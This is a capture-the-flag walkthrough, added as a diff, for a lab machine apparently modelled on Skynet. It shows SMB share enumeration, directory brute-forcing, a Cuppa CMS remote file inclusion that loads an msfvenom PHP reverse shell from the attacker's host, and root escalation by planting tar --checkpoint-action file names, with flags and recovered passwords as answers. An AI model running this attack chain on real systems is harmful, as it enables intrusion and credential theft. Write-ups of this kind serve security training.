@@ -1,0 +1,340 @@
+[Deploy and compromise the vulnerable machine!]
+
+[*] Target: 10.10.84.57
+
+[Question 1] What is Miles password for his emails? => cyborg007haloterminator
+
+    [Hint] Enumerate Samba
+
+[+] Okay, I will try to enumerate this using smbmap and default credential of smb anonymous:anonymous
+
+    # smbmap -H 10.10.84.57 -u anonymous -p anonymous
+    
+    [+] Guest session       IP: 10.10.84.57:445     Name: 10.10.84.57                                       
+            Disk                                                    Permissions     Comment
+            ----                                                    -----------     -------
+            print$                                                  NO ACCESS       Printer Drivers
+            anonymous                                               READ ONLY       Skynet Anonymous Share
+            milesdyson                                              NO ACCESS       Miles Dyson Personal Share
+            IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
+
+    [>>] # smbclient //10.10.84.57/anonymous -U anonymous%anonymous 
+
+            Try "help" to get a list of possible commands.
+            smb: \> ls
+            .                                   D        0  Fri Nov 27 00:04:00 2020
+            ..                                  D        0  Tue Sep 17 15:20:17 2019
+            attention.txt                       N      163  Wed Sep 18 11:04:59 2019
+            logs                                D        0  Wed Sep 18 12:42:16 2019
+
+                            9204224 blocks of size 1024. 5831532 blocks available
+            smb: \> get attention.txt
+            getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+
+
+            [>>] cat attention.txt 
+
+                 A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
+                 -Miles Dyson
+
+        [>>] I think we need to looking for something in the logs folder
+
+            smbclient //10.10.84.57/anonymous -U anonymous%anonymous
+            Try "help" to get a list of possible commands.
+            smb: \> cd logs
+            smb: \logs\> ls
+            .                                   D        0  Wed Sep 18 12:42:16 2019
+            ..                                  D        0  Fri Nov 27 00:04:00 2020
+            log2.txt                            N        0  Wed Sep 18 12:42:13 2019
+            log1.txt                            N      471  Wed Sep 18 12:41:59 2019
+            log3.txt                            N        0  Wed Sep 18 12:42:16 2019
+
+                            9204224 blocks of size 1024. 5831528 blocks available
+            smb: \logs\> get log1.txt
+            getting file \logs\log1.txt of size 471 as log1.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+
+        [>>] Now we can see that log1.txt is some kind of wordlist which may contains the miles's email password
+
+        [>>] But in the http://10.10.84.57/, I can't see any mail related information, in this case, we need to find some hidden directory
+
+            ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.84.57/FUZZ -fs 523
+
+
+                    /'___\  /'___\           /'___\       
+                   /\ \__/ /\ \__/  __  __  /\ \__/       
+                   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                    \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                     \ \_\   \ \_\  \ \____/  \ \_\       
+                      \/_/    \/_/   \/___/    \/_/       
+
+                v2.0.0-dev
+            ________________________________________________
+
+            :: Method           : GET
+            :: URL              : http://10.10.84.57/FUZZ
+            :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+            :: Follow redirects : false
+            :: Calibration      : false
+            :: Timeout          : 10
+            :: Threads          : 40
+            :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+            :: Filter           : Response size: 523
+            ________________________________________________
+
+            [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 210ms]
+                * FUZZ: admin
+
+            [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 208ms]
+                * FUZZ: css
+
+            [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 209ms]
+                * FUZZ: js
+
+            [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 209ms]
+                * FUZZ: config
+
+            [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 210ms]
+                * FUZZ: ai
+
+            [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 301ms]
+                * FUZZ: squirrelmail
+
+        [>>] So they redirect me to a login form http://10.10.84.57/squirrelmail/src/login.php => 
+
+            POST /squirrelmail/src/redirect.php HTTP/1.1
+            Host: 10.10.84.57
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 75
+            Origin: http://10.10.84.57
+            Connection: close
+            Referer: http://10.10.84.57/squirrelmail/src/login.php
+            Cookie: SQMSESSID=bjnmti1cjea33leoapmsuro4g1
+            Upgrade-Insecure-Requests: 1
+
+            login_username=§Miles§&secretkey=§123§&js_autodetect_results=1&just_logged_in=1
+
+        [>>] The Miles's credential is milesdyson:cyborg007haloterminator 
+
+[Question 2] What is the vulnerability called when you can include a remote file for malicious purposes? => /45kra24zxs28v3yd
+
+    [+] After loging in with the credential we found in the previous question, you can see the subject "Samba Password reset" from skynet@skynet
+
+        We have changed your smb password after system malfunction.
+        Password: )s{A&2Z=F^n_E.B`
+
+        smbclient //10.10.84.57/milesdyson -U milesdyson
+        Password for [WORKGROUP\milesdyson]: <Enter ")s{A&2Z=F^n_E.B`">
+        Try "help" to get a list of possible commands.
+        smb: \> ls
+        .                                   D        0  Tue Sep 17 17:05:47 2019
+        ..                                  D        0  Wed Sep 18 11:51:03 2019
+        Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 17:05:14 2019
+        Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019
+        Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 17:05:14 2019
+        notes                               D        0  Tue Sep 17 17:18:40 2019
+        Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 17:05:14 2019
+        Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 17:05:14 2019
+        
+        ....
+
+        smb: \notes\> get important.txt
+        getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+    [>>] # cat important.txt                                                                              
+
+            1. Add features to beta CMS /45kra24zxs28v3yd
+            2. Work on T-800 Model 101 blueprints
+            3. Spend more time with my wife
+
+[Question 3] What is the vulnerability called when you can include a remote file for malicious purposes? => Remote File Inclusion
+
+    [Note] I think this is a hint for the next step
+
+[Question 4] What is the user flag? => 7ce5c2109a40f958099283600a9ae807
+
+    [+] So in the view-source:http://10.10.84.57/45kra24zxs28v3yd/, we can't find any interesting thing:
+
+        <html>
+        <head>
+        <style>
+        body {
+        color: white;}
+        </style>
+        <body bgcolor="black">
+        <center><br />
+        <img src='miles.jpg'>
+        <h2>Miles Dyson Personal Page</h2><p>Dr. Miles Bennett Dyson ...fend the United States.</p>
+        </center>
+        </body>
+        </html>
+
+    [>>] May be the exploit can be found in another folder
+
+        ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.84.57/45kra24zxs28v3yd/FUZZ -fs 418
+
+                /'___\  /'___\           /'___\       
+               /\ \__/ /\ \__/  __  __  /\ \__/       
+               \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+                 \ \_\   \ \_\  \ \____/  \ \_\       
+                  \/_/    \/_/   \/___/    \/_/       
+
+            v2.0.0-dev
+        ________________________________________________
+
+        :: Method           : GET
+        :: URL              : http://10.10.84.57/45kra24zxs28v3yd/FUZZ
+        :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+        :: Follow redirects : false
+        :: Calibration      : false
+        :: Timeout          : 10
+        :: Threads          : 40
+        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+        :: Filter           : Response size: 418
+        ________________________________________________
+
+        [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 208ms]
+            * FUZZ: administrator
+
+        [>>] There is a Cuppa CMS login form in the http://10.10.84.57/45kra24zxs28v3yd/administrator/, I already try admin:admin credential which is Cuppa default username and password
+
+            [Note] you can find the credential in the https://www.cuppacms.com/en/docs/installation, but this attempt doesn't give me any result
+
+        [>>] And then I'm looking for Cuppa CMS exploit and found this https://www.exploit-db.com/exploits/25971 <=> Exploit Title: Cuppa CMS File Inclusion
+
+    [+] Okay, so after reading this, we all know what to do right =)) let's get into it
+
+    [Check] http://10.10.84.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd => Good! now we know the vulnerability is existed
+
+        [>>] http://10.10.84.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.56.1:8000/test.txt
+
+            [>>] python3 -m http.server 
+                 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+                 10.10.84.57 - - [12/Jul/2023 15:19:01] code 404, message File not found
+                 10.10.84.57 - - [12/Jul/2023 15:19:01] "GET /test.txt HTTP/1.0" 404 -
+
+            [Note] Using Wappalizer, we know that this website may execute PHP code
+
+                    $ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.14.56.1 LPORT=1234 -f raw -o shell.php
+
+                    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+                    [-] No arch selected, selecting arch: php from the payload
+                    No encoder specified, outputting raw payload
+                    Payload size: 1111 bytes
+                    Saved as: shell.php
+
+        [>>] http://10.10.84.57/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.14.56.1:8000/shell.php
+        
+             msf6 exploit(multi/handler) > set LHOST 10.14.56.1
+             LHOST => 10.14.56.1
+             
+             msf6 exploit(multi/handler) > set LPORT 1234
+             LPORT => 1234
+             
+             msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+             payload => php/meterpreter/reverse_tcp
+
+             msf6 exploit(multi/handler) > run
+
+             [*] Started reverse TCP handler on 10.14.56.1:1234 
+             [*] Sending stage (39927 bytes) to 10.10.84.57
+             [*] Meterpreter session 1 opened (10.14.56.1:1234 -> 10.10.84.57:51624) at 2023-07-12 15:25:17 +0800
+
+                meterpreter > cd /home
+                
+                meterpreter > ls
+
+                    Listing: /home
+                    ==============
+
+                    Mode              Size  Type  Last modified              Name
+                    ----              ----  ----  -------------              ----
+                    040755/rwxr-xr-x  4096  dir   2019-09-18 11:51:03 +0800  milesdyson
+
+                meterpreter > ls -al
+
+                    Listing: /home/milesdyson
+                    =========================
+
+                    Mode              Size  Type  Last modified              Name
+                    ----              ----  ----  -------------              ----
+                    020666/rw-rw-rw-  0     cha   2023-07-12 14:47:08 +0800  .bash_history
+                    100644/rw-r--r--  220   fil   2019-09-17 14:24:19 +0800  .bash_logout
+                    100644/rw-r--r--  3771  fil   2019-09-17 14:24:19 +0800  .bashrc
+                    100644/rw-r--r--  655   fil   2019-09-17 14:24:19 +0800  .profile
+                    040755/rwxr-xr-x  4096  dir   2019-09-18 11:55:01 +0800  backups
+                    040700/rwx------  4096  dir   2019-09-17 15:51:01 +0800  mail
+                    040755/rwxr-xr-x  4096  dir   2019-09-17 17:05:47 +0800  share
+                    100644/rw-r--r--  33    fil   2019-09-18 11:41:16 +0800  user.txt
+
+                meterpreter > cat user.txt
+                    
+                    7ce5c2109a40f958099283600a9ae807
+ 
+[Question 4] What is the root flag? => 3f0372db24753accc7179a282cd6a949
+
+    [Hint] A recursive call.
+
+    [+] "A recursive call" you know what I'm thinking right =)) crontab 
+
+    meterpreter > cat /etc/crontab
+        
+        # /etc/crontab: system-wide crontab
+        # Unlike any other crontab you don't have to run the `crontab'
+        # command to install the new version when you edit this file
+        # and files in /etc/cron.d. These files also have username fields,
+        # that none of the other crontabs do.
+
+        SHELL=/bin/sh
+        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+        # m h dom mon dow user  command
+        */1 *   * * *   root    /home/milesdyson/backups/backup.sh
+        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+       [>>] meterpreter > cd /home/milesdyson/backups
+            
+            meterpreter > ls
+            
+                Listing: /home/milesdyson/backups
+                =================================
+
+                Mode              Size     Type  Last modified              Name
+                ----              ----     ----  -------------              ----
+                100755/rwxr-xr-x  74       fil   2019-09-18 11:50:46 +0800  backup.sh
+                100644/rw-r--r--  4679680  fil   2023-07-12 15:39:01 +0800  backup.tgz
+
+            meterpreter > cat backup.sh
+
+                #!/bin/bash
+                cd /var/www/html
+                tar cf /home/milesdyson/backups/backup.tgz *
+
+        [>>] After stucking in a rabbit hole for hours, I found this https://gtfobins.github.io/gtfobins/tar/
+
+            [>>] But tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh => tar: Removing leading `/' from member names =((
+
+            [>>] In this case I just make things easier for you to understand, just create a bash script to read the command output and use the trick to execute it
+                 
+                 echo "ls /root > /tmp/output.txt" > ls_root.sh
+                 chmod +x ls_root.sh
+                 touch /var/www/html/--checkpoint=1
+                 touch /var/www/html/--checkpoint-action=exec=bash\ ls_root.sh
+
+                [>>] cat /tmp/output.txt => root.txt 
+
+            [>>] echo "cat /root/root.txt > /tmp/output2.txt" > cat_root.sh
+                 chmod +x cat_root.sh
+                 touch /var/www/html/--checkpoint=1
+                 touch /var/www/html/--checkpoint-action=exec=bash\ cat_root.sh
+
+                [>>] cat /tmp/output2.txt => 3f0372db24753accc7179a282cd6a949
+
+    [Note] Oh God! 5 freaking hours, I did it
